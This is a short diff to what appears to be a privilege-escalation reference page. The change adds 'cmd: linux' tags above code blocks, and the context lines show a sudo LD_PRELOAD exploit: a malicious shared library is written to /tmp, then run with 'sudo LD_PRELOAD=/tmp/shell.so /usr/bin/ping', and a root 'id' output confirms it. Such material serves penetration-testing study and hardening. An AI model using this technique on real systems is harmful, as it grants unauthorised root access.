@@ -18,6 +18,7 @@ env_reset, env_keep+=LD_PRELOAD
 
 ## Exploit
 
+<!-- cmd: linux -->
 ```bash
 # 1. Write the malicious shared library
 cat > /tmp/shell.c << 'EOF'
@@ -46,6 +47,7 @@ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/ping
 
 ## Verification
 
+<!-- cmd: linux -->
 ```bash
 id
 # uid=0(root) gid=0(root) groups=0(root)
